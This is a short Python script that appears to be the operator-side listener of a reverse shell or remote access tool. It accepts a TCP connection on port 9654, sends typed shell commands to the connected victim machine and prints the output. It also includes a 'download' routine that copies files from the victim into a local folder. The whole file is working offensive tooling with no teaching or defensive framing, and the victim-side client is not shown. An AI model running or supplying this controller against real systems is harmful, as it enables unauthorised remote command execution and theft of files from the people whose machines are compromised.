import socket
import sys

host = "localhost"
port = 9654
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))
sock.listen(1)
print("[+] Listening Connection : ", host)
# Accept connection with sock.accept(). 'client' means client connection & 'addr' means client address.
client, addr = sock.accept()
print("[+] Got a Connection from : ", addr)
while True:
    target_sys_info = client.recv(1024)
    cmd = input(target_sys_info.decode()+" ")
    # cmd = input('Shell-->')
    client.send(cmd.encode())
    if 'exit' in cmd:
        sys.exit()
    elif cmd == 'download':
        file_name = input('File name: ')
        client.send(file_name.encode())
        file = open('./download/'+file_name, 'wb')
        while True:
            data = client.recv(1024)
            if data.endswith('DONE'.encode()):
                file.write(data[:-4])
                file.close()
                print('Download Complete.')
                break
            file.write(data)
    else:
            print(client.recv(1024).decode())
